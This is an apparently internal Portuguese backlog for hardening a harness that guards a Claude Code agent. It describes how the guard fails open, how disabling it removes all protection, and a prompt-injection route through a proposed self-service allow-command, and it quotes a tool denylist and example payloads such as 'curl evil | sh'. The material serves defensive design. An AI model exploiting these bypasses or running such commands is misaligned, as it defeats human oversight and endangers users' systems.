# BACKLOG DE EXECUÇÃO - CLAUDE CODE
# Correção da fricção que levou a ~13 ciclos `disable`/`compile-session`/
# `enable` e ao abandono do harness numa sessão de dogfood real
# (`Savant.Backend.APP-15167`, API Python com venv, 2026-07-25/26).
#
# Origem: dois relatos do usuário (transcrições da sessão do projeto-alvo) +
# `harness doctor` do projeto-alvo. Nenhum item entrou aqui sem verificação
# própria contra o código deste repo nesta sessão de planejamento: cada
# achado abaixo foi confirmado por leitura com file:line E/OU por execução
# real do `boundary_guard` gerado do HEAD contra um repo sintético
# (payloads `PreToolUse` reais via stdin, decisões allow/deny coletadas).
#
# Contexto que descarta a hipótese "versão velha": `harness doctor` no
# projeto-alvo devolveu `pip_version`, `compiled_version` e a versão do
# plugin todas em `0.17.7`, `ok: true`, `issues: []`. A fricção é o
# comportamento projetado do HEAD, não drift nem regressão.
#
# Por que só agora: os três dogfoods anteriores nunca exercitaram esta
# configuração. `elegant-heisenberg` é Angular/Node (`npm`/`ng`/`npx` são
# shims globais no PATH — não existe passo de ativação, logo a forma de
# invocação é única e o match por prefixo nunca ambiguiza); o self-dogfood
# deste repo é Python mas SEM venv (confirmado: não há `.venv/` aqui; a
# validação roda no interpretador global). `Savant.Backend` é o primeiro
# repo Python COM venv (`.venv\Scripts\`, layout Windows) contra a Bash tool
# POSIX, e o primeiro atrás de proxy corporativo (TLS do `uv` bloqueado).
# Agravante de timing: as três features que mediaram toda a fricção são as
# mais novas do repo e nasceram do dogfood Node — `76ab4a6` (v0.17.5, escape
# read-only + `cd`), `ddc37f6` (v0.17.6, `governance.extra_allowed_commands`)
# e `6800418` (branch-first + `protected_branches`). Nenhuma tinha sido
# exercida contra Python com venv. Não é regressão: é buraco de cobertura.
#
# Alvo de código: `src/harness/boundary_guard.py`,
# `src/harness/session_start.py`, `src/harness/stop_hook.py`,
# `src/harness/session_permissions.py`, `src/harness/preflight.py`,
# `src/harness/cli.py`, `src/harness/doctor.py`. Testes:
# `tests/test_boundary_guard.py`, `tests/test_session_permissions.py`,
# `tests/test_preflight.py`, `tests/test_cli.py`, `tests/test_doctor.py`.
#
# Validação global ao fechar: `$env:PYTHONPATH = "src"; python -m pytest
# tests -q` 100% verde.

---

## Critério de ordenação

Ordenado por `(severidade, fricção eliminada ÷ esforço)`, não por ordem de
descoberta. Itens 1-2 vêm primeiro por severidade (um é furo de segurança
silencioso, o outro é o único que teria evitado os 13 ciclos *antes* de
começar). Itens 3-4 são os que matam o volume da fricção. Itens 5-8 são
ergonomia barata. O item 9 está BLOQUEADO em decisão do dono do repo.

## Decisão pendente do dono do repo (bloqueia só o Item 9)

Ampliar a superfície de COMANDO exige hoje editar `.harness/harness.yaml`,
que o guard nega — daí o ciclo `disable`/edit/`compile-session`/`enable`.
Quatro posturas foram apresentadas; a escolha define o Item 9:

- **A** — `harness allow-command <cmd>` self-service pro agente, filtrado
  pelo floor + audit log + as 5 mitigações do Item 9.
- **B** — mesma CLI, mas negada ao agente pelo guard: só o usuário roda no
  terminal próprio. 1 interrupção por comando novo em vez de 3.
- **C** — nenhuma CLI nova; só Itens 3 e 4.
- **D** — implementar Itens 1-8, medir num dogfood real, decidir A/B/C com
  dado. **Recomendação atual**, porque a estimativa é que os Itens 3+4
  cortem ~70% da demanda por comando novo — e se cortarem, A resolve pouco
  e custa os contras listados no Item 9.

Enquanto não houver decisão, os Itens 1-8 seguem sem dependência dela.

---

## Item 1 — ✅ ENTREGUE — Hooks invocam `python` do PATH: guard falha ABERTO em silêncio

> **Entregue na onda 1.** Novo módulo `src/harness/hook_launcher.py`
> (`hook_command`/`interpreter_from_command`/`interpreter_problem`), consumido
> pelos 3 instaladores e pelo `doctor` (campo novo `hooks` no laudo). Prova de
> execução real, não só teste unitário: com `python` REMOVIDO do PATH, o
> comando bakeado roda o guard e devolve `deny` para `git push origin main`;
> o comando legado sai com 127 sem emitir decisão — que, pela semântica de
> exit code do Claude Code, deixaria o `git push` passar. `doctor` reporta
> `ok: False` no formato legado e `ok: True` depois do `compile-session`.
> Correção adicional não prevista: os 3 instaladores passaram a casar
> entrada gerenciada também por NOME DE ARQUIVO — sem isso, a mudança de
> formato do `command` deixaria a entrada antiga órfã no `settings.json` e o
> hook rodaria duas vezes por tool call.

**Achado:** os três hooks instalados montam o comando com o executável nu:

- [`boundary_guard.py:2337`](../../src/harness/boundary_guard.py) — `command = f'python "{script_path}"'`
- [`session_start.py:199`](../../src/harness/session_start.py) — idem
- [`stop_hook.py:311`](../../src/harness/stop_hook.py) — idem

`python` é resolvido pelo PATH do shell que executa o hook, no momento da
tool call. Se não resolver — venv desativado, PATH divergente, ou o stub da
Microsoft Store no Windows (sai com 9009) — o processo morre sem emitir
decisão nenhuma.

**Por que é grave:** confirmado na doc oficial do Claude Code (seção de exit
codes de hooks) que **apenas exit 2 bloqueia**; qualquer outro código
não-zero é erro não-bloqueante e a execução prossegue — a doc chama isso
explicitamente de armadilha ("Claude Code treats exit code 1 as a
non-blocking error and proceeds with the action"). Ou seja: interpretador
irresolúvel ⇒ **tool call passa sem floor, sem proteção de segredo, sem
bloqueio de push, sem gate de evidência**, e a única pista é uma linha de
`hook error` no transcript.

**O que NÃO é a correção:** o guard já é fail-closed internamente —
[`boundary_guard.py:2232-2236`](../../src/harness/boundary_guard.py)
transforma qualquer exceção em `deny`. Não há como fechar de dentro do
Python o caso em que o Python nunca inicia. A correção é exclusivamente no
lançador.

**Correção proposta:** bakear o interpretador absoluto (`sys.executable`,
resolvido no `compile-session`, mesmo momento em que `install_boundary_guard`
já resolve `target_dir` e grava `repo_root` no
`compiled-state-session.json`) nos três hooks, com aspas para caminho com
espaço. Complemento em `doctor.py`: novo check que confirma que o
interpretador bakeado em cada `command` do `settings.json` ainda existe e é
executável — vira `issue` se não for, já que o sintoma runtime é invisível.

**Risco residual assumido (documentar):** se o venv do projeto for recriado
ou o interpretador movido, os hooks apontam pra caminho morto — mesmo
fail-open de hoje, porém agora **detectável** por `harness doctor` em vez de
silencioso.

**Verify:** `python -m pytest tests/test_boundary_guard.py
tests/test_doctor.py -q` com casos novos: (a) `install_boundary_guard` grava
`command` contendo `sys.executable` absoluto e entre aspas; (b) idem para
`session_start`/`stop_hook`; (c) `doctor` reporta `issue` quando o
interpretador do `command` não existe em disco; (d) `doctor` fica `ok` no
caminho feliz.

**Esforço:** S — **Risco se não corrigir:** ALTO (bypass silencioso e total
do guard, sem registro; a sessão do Savant.Backend reunia exatamente as
condições — venv, PATH sendo mexido a cada tentativa, 13 ciclos de
disable/enable — mas não há registro que permita afirmar nem descartar que
ocorreu).

---

## Item 2 — ✅ ENTREGUE — `preflight` não verifica se o comando inferido resolve no shell do agente

> **Entregue na onda 1, com uma correção de projeto.** A correção proposta
> abaixo mandava EXECUTAR o comando a seco com `shell=True`. Isso viola a
> stop condition documentada de `run_preflight` — "Read-only absoluto:
> nenhum byte é escrito no alvo" (`preflight.py`) —, porque `pytest` cria
> `.pytest_cache/` e `__pycache__/`. Implementado por RESOLUÇÃO
> (`shutil.which`) em vez de execução: responde a mesma pergunta com zero
> efeito colateral e, no Windows, respeita `PATHEXT`, então shims `.cmd`/
> `.exe` (`ng`, `npm`) são encontrados — o que torna desnecessária a
> exigência de `shell=True` que motivava o parágrafo original.
> Dois checks novos (`test_command_resolvable`, `lint_command_resolvable`),
> nunca FAIL, e um terceiro desfecho que o texto original não previa:
> **sombra de venv** — o binário resolve FORA do venv embora exista um
> homônimo dentro dele. Esse caso é pior que não resolver, porque o comando
> roda e falha em silêncio no ambiente errado.
> Limite assumido e documentado no código: `shutil.which` usa o PATH do
> processo que roda o preflight, que pode não ser o do shell da Bash tool.

**Achado:** [`run_preflight`](../../src/harness/preflight.py) avalia 4
categorias — git ([`_check_git:177`](../../src/harness/preflight.py)),
manifesto ([`_check_manifest:345`](../../src/harness/preflight.py)), testes
([`_check_tests:396`](../../src/harness/preflight.py)) e lint
([`_check_lint:470`](../../src/harness/preflight.py)). Todas checam
*declaração*: existe manifesto, existe runner declarado, existe config de
lint. **Nenhuma checa execução** — se o `test_command` inferido de fato
resolve no shell que o agente vai usar.

**Consequência observada:** no projeto-alvo, o analyzer leu o manifesto,
inferiu `pytest`, gravou no `repo-profile.json`, e ninguém verificou que
`pytest` nu não está no PATH sem ativar `.venv\Scripts`. **Preflight
devolveu READY.** O contrato foi compilado com um `verify_cmd` que não
executa, e a descoberta da forma correta virou tentativa-e-erro sob guard
ativo — exatamente os itens 3, 4 e 6 dos 7 relatados.

**Por que este item é o de maior ROI:** é o único que ataca a fricção
*antes* do contrato existir. Os demais reduzem o custo de errar; este evita
o erro.

**Correção proposta:** novo check na categoria Verificação/TDD — executa o
`test_command` inferido (e o `lint_command`, se houver) em modo de
resolubilidade, com `shell=True` e `encoding` explícito, espelhando
[`verify.py:127-134`](../../src/harness/verify.py) (obrigatório: sem
`shell=True` todo shim `.cmd` do Windows dá falso "não encontrado" — erro já
cometido e corrigido no backlog do elegant-heisenberg). Distingue dois
desfechos:

- binário não resolve (exit 127 / 9009, ou `FileNotFoundError`) →
  **WARNING**, nunca FAIL, com Actionable Fix nomeando as três formas
  candidatas detectadas em disco: `.venv/Scripts/<bin>`, `python -m <bin>`,
  `<bin>` nu;
- binário resolve mas o comando falha (qualquer outro exit) → **PASS**:
  suíte vermelha é o estado ESPERADO em repo pré-TDD, não problema de
  prontidão. Esta distinção é obrigatória; sem ela o preflight vira ruído
  (mesmo erro apontado no achado 2 do backlog de fricção anterior).

Detecção de venv como sinal adicional: se existir `.venv/` ou `venv/` na
raiz e o comando inferido não citar esse prefixo, o Actionable Fix diz isso
explicitamente.

**Verify:** `python -m pytest tests/test_preflight.py -q` com casos novos:
comando inexistente → WARNING com fix citando as 3 formas; comando que
existe e falha → PASS; repo com `.venv/` + comando nu → WARNING específico
de venv; repo sem venv e comando resolvendo → PASS. Mais um caso de shim
`.cmd` provando que `shell=True` está presente.

**Esforço:** M — **Risco se não corrigir:** ALTO (todo próximo repo Python
com venv repete os 13 ciclos).

---

## Item 3 — `extra_allowed_commands` é bakeado no script gerado; mudá-lo exige recompilar

**Achado:** [`boundary_guard.py:1411`](../../src/harness/boundary_guard.py)
grava a allowlist como constante literal no script standalone
(`EXTRA_ALLOWED_COMMANDS = {...!r}`), lida de
`.harness/harness.yaml` uma única vez por
[`install_boundary_guard:2303`](../../src/harness/boundary_guard.py).
Qualquer mudança na allowlist exige re-render, ou seja `compile-session`.

**Por que o bake não se justifica:** o guard **já lê dois JSONs do disco a
cada tool call** — `feature_list.json` e `repo-profile.json`, via `_load_json`
em `_evaluate_bash`/`_evaluate_powershell`/`_evaluate_file`. Ler um terceiro
arquivo é custo marginal nulo. Não há razão de performance para o bake; é
acidente de implementação.

**Fricção que isso causa:** hoje, mesmo o **usuário** editando o
`harness.yaml` no terminal próprio — onde nenhum hook intercepta e portanto
`disable` seria dispensável — ainda precisa rodar `compile-session` pra
mudança valer. Com runtime-read, o ciclo de 3 operações cai para 1 (editar o
arquivo), sem CLI nova e sem qualquer mudança de postura de segurança.

**Correção proposta:** o script gerado passa a ler
`governance.extra_allowed_commands` de `.harness/harness.yaml` em runtime,
ancorado no `repo_root` (mesma âncora já resolvida por
`_resolve_repo_root_anchor`, não no `cwd` do payload, que pode derivar).
Restrição obrigatória: o script standalone é **stdlib-only** por design
(docstring do módulo) — não pode `import yaml`. Duas saídas, decidir na
implementação:

1. `compile-session` grava a lista já normalizada em
   `.harness/compiled-state-session.json` (JSON, stdlib) e o guard lê de lá.
   Mantém o YAML como fonte única versionada, mas ainda exige
   `compile-session` — **não resolve o item**, descartada.
2. Parser mínimo, stdlib, restrito à sublista
   `governance.extra_allowed_commands` do YAML (lista de strings, sintaxe de
   bloco `- item`). Falha de parse → lista vazia, mesma degradação graciosa
   de [`load_extra_allowed_commands:1193`](../../src/harness/boundary_guard.py).
   **Preferida**, com o custo honesto: um segundo parser, propositalmente
   burro, precisa ser documentado como tal e testado contra YAML que ele
   NÃO entende (aspas, flow style `[a, b]`, comentários inline) provando que
   degrada pra vazio em vez de aceitar lixo.

Fail-safe inegociável: erro de leitura/parse **nunca** amplia a superfície —
sempre reduz para a lista vazia.

**Verify:** `python -m pytest tests/test_boundary_guard.py -q` com casos
novos: allowlist editada no YAML vale sem re-render; YAML ausente/inválido/
flow-style/com aspas → lista vazia (deny preservado, nunca allow); floor
continua incondicional mesmo com o comando de floor declarado no YAML.

**Esforço:** M — **Risco se não corrigir:** médio (mantém `compile-session`
obrigatório em todo ajuste de allowlist; é 1 das 3 operações de cada ciclo).

---

## Item 4 — Match por prefixo tranca a FORMA de invocação, não o binário

**Achado:** [`_segment_prefixes_any:1532`](../../src/harness/boundary_guard.py)
exige `seg_tokens[:len(seq)] == seq`. Com `verify_cmd: "pytest -q"`, só
passa comando que **começa** literalmente com `pytest`.

**Evidência (execução real do guard do HEAD contra repo sintético,
`verify_cmd: "pytest -q"`, `extra_allowed_commands: ["python -m ruff"]`):**

```
allow  pytest -q
allow  pytest -q tests/test_api.py
deny   python -m pytest -q
deny   .venv/Scripts/pytest.exe -q
deny   source .venv/Scripts/activate && pytest -q
deny   ruff check .
deny   ./verify-env.sh python -m ruff check .
```

Num venv Windows, a forma **correta** é exatamente a que o guard nega. E
descobrir a forma que funciona é iterativo por natureza — daí os itens 3, 4
e 6 do relato (`.venv/Scripts/ruff` → `python -m ruff` → `.venv/Scripts/ruff`
de novo), cada tentativa custando um ciclo completo.

**Correção proposta:** normalizar a forma de invocação **antes** do match,
em ambos os lados (segmento avaliado e entrada da allowlist), reduzindo à
mesma forma canônica:

- `python -m <mod> …` → `<mod> …` — **somente** com `-m`; `python -c` e
  `python <script.py>` NÃO normalizam (não são invocação de binário);
- `<dir>/<bin>[.exe] …` → `<bin> …` quando `<dir>` casa
  `.venv/Scripts`, `.venv/bin`, `venv/Scripts`, `venv/bin` — prefixos de
  venv apenas, não basename genérico (senão `./scripts/deploy.sh` viraria
  `deploy.sh` e casaria allowlist alheia);
- `uv run <bin> …` → `<bin> …`.

Invariantes inegociáveis:

1. A normalização roda **depois** do floor, nunca antes — o floor continua
   vendo o comando bruto (`python -m twine upload` já é pego hoje pela
   sequência `twine upload`; a normalização não pode criar caminho novo
   para escapar dele).
2. Normalizar não amplia allowlist por si: `python -m pip install evil`
   normaliza para `pip install evil`, que continua não prefixando
   `pip install -e .`. O ganho é só de forma, não de escopo.
3. `python -m http.server`, `python -m venv`, e afins só passam se alguém os
   declarou — normalização não é allowlist.

**Verify:** `python -m pytest tests/test_boundary_guard.py -q` com as 7
linhas da tabela de evidência acima como casos, invertendo os 4 `deny` que
são forma-equivalente para `allow`, e mantendo `deny` em: `ruff check .` sem
declaração; `python -c "import os; os.system(...)"`; `python -m twine upload`
(floor); `./scripts/deploy.sh` (não é prefixo de venv).

**Esforço:** M — **Risco se não corrigir:** ALTO (é a causa-raiz direta dos
itens 3, 4 e 6 do relato — o maior volume isolado de ciclos).

---

## Item 5 — Mensagens de deny não apontam o escape que existe

**Achado:** duas mensagens mandam o agente pro caminho caro quando existe um
barato:

1. [`_evaluate_bash:1959-1966`](../../src/harness/boundary_guard.py) e o
   deny de superfície de `_evaluate_file` dizem "replaneje via
   `/harness-creator:plan`" — mas `harness task add-file` já existe
   ([`cli.py:57`](../../src/harness/cli.py)) e já está liberado no guard
   (`task` está em `_HARNESS_SUBCOMMANDS`,
   [`boundary_guard.py:1398`](../../src/harness/boundary_guard.py)).
   Verificado por execução: declarar o path via `add-file` faz o mesmo
   `Write` virar `allow`. Foi o item 5 do relato — criar `verify-env.sh` na
   raiz custou um ciclo inteiro por causa disso.
2. [`_protected_branch_commit_problem:1420`](../../src/harness/boundary_guard.py)
   sugere `harness compile-session`, que não resolve nada quando o problema
   é estar em `main`. Foi o item 7 do relato, e o agente do projeto-alvo
   diagnosticou errado — atribuiu o deny à tokenização da mensagem de
   commit. Verificado: em branch não-protegida, `git commit -m "..."`,
   `-F -`, mensagem multi-linha e `git commit` nu são **todos allow**; em
   `main`, **todos deny**. A hipótese da tokenização é falsa.

**Correção proposta:** deny de superfície de arquivo cita
`harness task add-file <task_id> <path>` com o `task_id` do contrato ativo
já preenchido. Deny de branch protegida cita `git checkout -b <tipo>/<slug>`
e diz explicitamente que a mensagem de commit não é o problema — o texto
atual induziu diagnóstico errado numa sessão real, e isso é custo medido,
não hipotético.

**Verify:** `python -m pytest tests/test_boundary_guard.py -q` — asserts de
substring nas duas mensagens; caso confirmando que `git commit -m` em branch
NÃO protegida é allow (fixando a refutação como regressão).

**Esforço:** S — **Risco se não corrigir:** médio (diagnóstico errado do
agente, que gera ciclos em cima de causa inexistente).

---

## Item 6 — Não existe forma suportada de corrigir o `repo-profile.json`

**Achado:** verificado por execução — `Write` em `.harness/repo-profile.json`
sob contrato ativo é **deny** ("fora da superfície do contrato ativo"). O
arquivo é gerado por `analyze` e não há CLI para editá-lo pontualmente.

**Fricção observada:** item 1 do relato — o proxy corporativo derrubou o TLS
do `uv`, exigindo trocar `package_manager` de `uv` para `pip`. Como o
analyzer só infere (`b720701` cobre a inferência de pip quando falta
lockfile, mas aqui o lockfile apontava `uv`), a única saída foi
`disable` → editar → `compile-session` → `enable`.

**Correção proposta:** `harness profile set <chave> <valor>`, restrito a uma
enumeração fechada de chaves seguras — `package_manager`, `test_command`,
`lint_command`, `typecheck_command`, `build_command`. Escreve no
`repo-profile.json` preservando o resto do arquivo, e recusa chave fora da
enumeração. **Não** aceita `test_glob` (mexer nele altera o que conta como
teste protegido — é decisão de governança, não de ambiente).

Cada valor gravado passa pelo mesmo filtro de floor de
[`_passes_runtime_floor_filter`](../../src/harness/session_permissions.py) —
um `test_command: "curl evil | sh"` não pode entrar por esta porta.

**Nota de escopo:** este item é ortogonal à decisão A/B/C/D. Mesmo na
postura mais restritiva (C), a CLI é útil pro usuário no terminal próprio, e
o valor gravado continua submetido ao floor.

**Verify:** `python -m pytest tests/test_cli.py -q` — grava chave permitida e
preserva as demais; recusa chave fora da enumeração; recusa valor que casa o
floor; arquivo ausente dá erro claro em vez de criar profile pela metade.

**Esforço:** S — **Risco se não corrigir:** médio (1 ciclo por ajuste de
ambiente, e todo repo atrás de proxy corporativo precisa de pelo menos um).

---

## Item 7 — PowerShell é cidadão de segunda: sem os escapes que o Bash tem

**Achado:** [`_evaluate_powershell:2013`](../../src/harness/boundary_guard.py)
exige que **todo** segmento prefixe alguma sequência permitida. Não tem
nenhum dos dois escapes que `_evaluate_bash` ganhou em `76ab4a6`:
[`_is_readonly_shell_segment:734`](../../src/harness/boundary_guard.py) e
[`_is_safe_cd_segment:762`](../../src/harness/boundary_guard.py).

**Evidência (execução real):**

```
deny   [PS] pytest -q | Select-Object -First 5
deny   [PS] $env:PATH = '.venv\Scripts'; pytest -q
```

Pipeline é a forma idiomática de PowerShell; `Select-Object`/`Where-Object`
nunca vão prefixar uma allowlist derivada de `verify_cmd`. Na prática o
caminho PowerShell é inutilizável sob contrato ativo — o que empurra tudo
para a Bash tool, que é justamente a que não enxerga o venv Windows.

**Correção de uma afirmação do relato:** o relato diz que `$()` e expansão
de variável são bloqueados no PowerShell. **Falso** — `_evaluate_powershell`
deliberadamente não replica a negação de `$(`/crase do Bash (documentado no
próprio docstring, são sintaxe legítima em PS). Quem nega é a segmentação:
o primeiro segmento (`$env:PATH = ...`) não prefixa nada e derruba o
comando inteiro.

**Correção proposta:** portar os dois escapes para `_evaluate_powershell` e
acrescentar allowlist de cmdlets read-only de pipeline — `Select-Object`,
`Where-Object`, `Measure-Object`, `Sort-Object`, `Format-Table`,
`Format-List`, `Out-String`, `ForEach-Object` **excluído** (executa
scriptblock arbitrário). Atribuição a `$env:*` **não** entra: muda o
ambiente de execução dos comandos seguintes, e liberá-la reabre por outra
porta o problema de PATH que o Item 4 resolve de forma controlada.

**Verify:** `python -m pytest tests/test_boundary_guard.py -q` — pipeline com
cmdlet read-only vira allow; `| ForEach-Object { ... }` continua deny;
`$env:PATH = ...` continua deny; floor de rede PS (`iwr`/`irm`) intocado.

**Esforço:** M — **Risco se não corrigir:** médio (não estava nos 7 itens do
relato, mas fecha o único caminho que enxerga o venv Windows nativamente).

---

## Item 8 — `settings.json` emite `Bash(<verify_cmd>)` sem sufixo de prefixo

**Achado:** [`session_permissions.py:190`](../../src/harness/session_permissions.py)
gera `Bash({verify_cmd})` — literal exato. As regras de git e de harness CLI,
logo acima e abaixo, usam a forma prefixada (`Bash(git commit*)`,
[`:90`](../../src/harness/session_permissions.py); `Bash(harness {sub}*)`,
[`:102`](../../src/harness/session_permissions.py)), e
`extra_allowed_commands` também ([`:214-215`](../../src/harness/session_permissions.py)).
Só o `verify_cmd` ficou exato.

**Consequência:** `pytest -q tests/test_api.py` é **allow** no
`boundary_guard` (verificado por execução) mas não casa a regra
`Bash(pytest -q)` do `settings.json` — cai no fluxo de permissão e vira
prompt. Fadiga de prompt silenciosa, invisível nos relatos porque não é
deny, só é atrito.

**Sintaxe VERIFICADA na doc oficial** (`code.claude.com/docs/en/permissions`,
seções "Use specifiers for fine-grained control" e "Wildcard patterns") —
a suspeita inicial de que as demais regras estariam na forma errada é
**FALSA**, e o escopo deste item encolhe em vez de crescer:

- `Bash(npm run build)` — *"Matches the exact command `npm run build`"*.
  Confirma o defeito: sem wildcard, o match é exato.
- Wildcard é válido em **qualquer posição**, com ou sem espaço antes:
  *"The space before `*` matters: `Bash(ls *)` matches `ls -la` but not
  `lsof`, while `Bash(ls*)` matches both."*
- `:*` é açúcar sintático equivalente, reconhecido **apenas no fim** do
  padrão: *"The `:*` suffix is an equivalent way to write a trailing
  wildcard, so `Bash(ls:*)` matches the same commands as `Bash(ls *)`"*.

Portanto `Bash(git commit*)` e `Bash(harness {sub}*)` já no código são
válidos e funcionam. Ressalva menor, sem ação: sem o espaço eles casam
também `git commitfoo`/`harness auditxyz` — folga inofensiva, já que o
enforcement real é o `boundary_guard`, não o `settings.json`.

**Correção proposta:** `verify_cmd` passa a emitir a forma prefixada, como
as demais. **Detalhe que a doc não resolve:** `Bash(pytest -q *)` exige
espaço seguido de algo, então provavelmente NÃO casa o `pytest -q` nu — e
esse é justamente o comando canônico do contrato. Emitir as **duas** regras
(`Bash(pytest -q)` e `Bash(pytest -q:*)`), em vez de trocar uma pela outra.
Confirmar o comportamento do caso nu empiricamente antes de fechar; se
casar, a regra exata vira redundante e pode sair.

**Verify:** `python -m pytest tests/test_session_permissions.py -q` — regra
exata E prefixada emitidas para cada `verify_cmd`; filtro de floor
([`_passes_runtime_floor_filter:119`](../../src/harness/session_permissions.py))
continua removendo entrada de floor nas duas formas — ele hoje faz strip só
de `*` final, e `:*` deixa um `:` pendurado que a tokenização de
`is_floor_bash_command` não trata. **Caso de teste obrigatório:**
`verify_cmd: "git push origin main"` não sobrevive em nenhuma das formas.

**Esforço:** S — **Risco se não corrigir:** baixo (atrito, não bloqueio).

---

## Item 9 — BLOQUEADO EM DECISÃO — `harness allow-command <cmd>`

**Só implementar após a escolha A/B/C/D registrada acima.** Descrito aqui
para a decisão ser tomada com o desenho na mão.

**Achado:** não existe caminho suportado para ampliar a superfície de
COMANDO. `harness task add-file` cobre a de ARQUIVO; a de comando exige
editar o `harness.yaml`, que o guard nega. Itens 2, 3 e 6 do relato saíram
daí — 3 ciclos completos.

**Desenho (postura A):** subcomando `allow-command` adicionado a
`_HARNESS_SUBCOMMANDS` (logo, executável pelo agente), fazendo append em
`governance.extra_allowed_commands`, recusando qualquer entrada que case o
floor, e gravando registro auditável (comando, timestamp, contrato ativo).
Combinado com o Item 3, vale imediatamente.

**Argumento a favor mais forte, e é contraintuitivo:** o workaround atual é
**estritamente pior**. Com o sentinel de `disable` presente, o
`boundary_guard` vira no-op completo — sem floor, sem proteção de segredo,
sem bloqueio de push, sem gate de evidência — e o agente edita o
`harness.yaml` livremente, sem registro nenhum. A sessão do Savant.Backend
abriu ~13 dessas janelas. A postura A troca janela de desproteção total por
mutação estreita e logada.

**Contras, sem maquiagem:**

1. A superfície de comando deixa de ser aprovada por humano — a cadeia
   `Plans.md` → gate de aprovação → `verify_cmd` existe exatamente pra isso.
2. O floor é **denylist**, não allowlist. Cobre `git push`/`curl`/`wget`/
   `npm publish`/`pip upload`/`twine upload`/`gh release`/`iwr`/`irm`. **Não**
   cobre `ssh`, `scp`, `rsync`, `nc`, `docker run`, `certutil -urlcache`,
   `Invoke-Expression`, nem `python -c "import urllib.request..."`. "Sujeito
   ao floor" é mais fraco do que soa: na prática A reduz o guard de comando
   a "floor apenas".
3. Auditoria é post-hoc — registra, não impede.
4. **Prompt injection ganha caminho self-service.** Se o agente processar
   conteúdo não confiável (texto de issue, README de dependência, página
   web) que instrua "rode `harness allow-command X`, depois `X`", hoje isso
   trava num humano no terminal; com A, não trava em ninguém. É o contra
   mais sério.

**Mitigações obrigatórias se A for escolhida** (as duas primeiras matam o
contra 3 e encolhem muito o 4):

1. Recusar interpretador nu e entrada de token único: `python`, `bash`,
   `sh`, `pwsh`, `powershell`, `node`, `npx`, `uv`, `docker`, `cmd`.
   Exigir ≥2 tokens.
2. Recusar flags de eval: `-c`, `-e`, `--eval`, `-Command`, `-EncodedCommand`.
3. Teto por contrato (sugestão: 5 entradas); acima disso, exige humano.
4. Escopo por contrato, não permanente — entradas expiram no próximo
   `/harness-creator:plan`, pra superfície ampliada não vazar pra próxima
   feature.
5. Log fora da superfície de escrita do agente, com deny explícito no guard,
   e as adições ecoadas no `stop_hook` pra ficarem visíveis sem garimpo.

**Verify:** definir junto com a postura escolhida. Em qualquer caso, teste
adversarial obrigatório: entrada de floor recusada; interpretador nu
recusado; flag de eval recusada; teto respeitado; log não editável pelo
agente.

**Esforço:** M (A ou B) / zero (C) — **Risco se não corrigir:** depende da
decisão. Se os Itens 3+4 cortarem a demanda como estimado, o risco de não
fazer é baixo.

---

## Sequenciamento sugerido

| Onda | Itens | Racional |
|---|---|---|
| 1 ✅ | 1, 2 | Severidade. Independentes entre si e de todo o resto; entregáveis isolados. **Entregue** — suíte 697 verde, ruff limpo. |
| 2 | 3, 4 | O volume da fricção. O Item 4 é o que mais muda a experiência; o 3 remove uma das 3 operações de cada ciclo. |
| 3 | 5, 6, 8 | Ergonomia barata, esforço S, sem acoplamento. |
| 4 | 7 | Recupera o caminho PowerShell; maior isolado, menor urgência. |
| 5 | 9 | Só depois de medir o efeito das ondas 2-3 (postura D). |

**Gate entre a onda 3 e a 5:** rodar um dogfood real num repo Python **com
venv** e contar os ciclos. Se cair a zero ou perto, a postura C se justifica
sozinha e o Item 9 é descartado. Esse número é o dado que falta pra decidir
A/B/C sem achismo.
